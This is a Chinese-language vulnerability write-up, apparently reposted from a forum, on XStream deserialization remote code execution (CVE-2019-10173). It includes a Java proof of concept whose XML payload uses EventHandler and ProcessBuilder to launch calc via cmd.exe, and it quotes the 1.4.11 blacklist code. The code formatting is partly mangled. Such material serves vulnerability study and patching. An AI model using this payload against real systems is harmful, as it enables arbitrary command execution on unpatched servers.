# （CVE-2019-10173）Xstream 远程代码执行漏洞

> 原文：[https://www.zhihuifly.com/t/topic/3286](https://www.zhihuifly.com/t/topic/3286)

# （CVE-2019-10173）Xstream 远程代码执行漏洞

## 一、漏洞简介

Xstream 1.4.10版本存在反序列化漏洞CVE-2013-7285补丁绕过。

## 二、漏洞影响

XStream <= 1.4.6

XStream = 1.4.10

## 三、复现过程

### poc

```
package com.bigo;

import com.thoughtworks.xstream.XStream;

import java.beans.EventHandler;

import java.io.IOException;

import java.util.Set;

import java.util.TreeSet;

/**

*   Created by cfchi on 2019/7/26.

    */

    public class Main {

    public static String expGen(){

    XStream xstream = new XStream();

    Set<Comparable> set = new TreeSet<Comparable>();

    set.add(“foo”);

    set.add(EventHandler.create(Comparable.class, new ProcessBuilder(“calc”), “start”));

    String payload = xstream.toXML(set);

    System.out.println(payload);

    return payload;

    }

    public static void main(String[] args) throws IOException {

    expGen();

    XStream xStream = new XStream();

    String payload = “<sorted-set>\n” +

    "    <string>foo</string>\n" +

    "    <dynamic-proxy>\n" +

    "    <interface>java.lang.Comparable</interface>\n" +

    "        <handler class=“java.beans.EventHandler”>\n" +

    "            <target class=“java.lang.ProcessBuilder”>\n" +

    "                <command>\n" +

    "                    <string>cmd.exe</string>\n" +

    "                    <string>/c</string>\n" +

    "                    <string>calc</string>\n" +

    "                </command>\n" +

    "            </target>\n" +

    "     <action>start</action>"+

    "        </handler>\n" +

    "    </dynamic-proxy>\n" +

    “</sorted-set>\n”;

    xStream.fromXML(payload);

    }

    } 
```

### 1.4.7版本白名单

![image](img/87ce7d153d489d43d499fc9a8f100e07.png)

### 1.4.10版本，黑名单未开启

![image](img/6140e2f2a630e0354e98b97c2f0f80c8.png)

### 1.4.11版本，黑名单开启

#### 黑名单

```
private class InternalBlackList implements Converter {
    private InternalBlackList() {
    }

```
public boolean canConvert(Class type) {
    return type == Void.TYPE || type == Void.class || !XStream.this.securityInitialized &amp;&amp; type != null &amp;&amp; (type.getName().equals("java.beans.EventHandler") || type.getName().endsWith("$LazyIterator") || type.getName().startsWith("javax.crypto."));
}

public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {
    throw new ConversionException("Security alert. Marshalling rejected.");
}

public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
    throw new ConversionException("Security alert. Unmarshalling rejected.");
} 
``` `}` 
```

![image](img/63904bf8ee8bba9301827b25a3c83195.png)

## 参考链接

> http://www.polaris-lab.com/index.php/archives/658/